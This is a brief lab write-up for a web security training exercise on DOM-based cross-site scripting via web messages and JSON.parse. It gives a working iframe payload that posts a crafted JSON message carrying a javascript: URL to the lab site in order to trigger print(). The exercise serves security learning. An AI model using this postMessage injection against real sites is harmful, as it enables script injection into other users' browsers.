Lab #3 – DOM XSS using web messages and JSON.parse


Target Goal - Exploit DOM based XSS vulnerability to call the print() function.


Analysis:

<iframe src="https://0a1100160422108f8297609f00c40066.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}", "*")' >
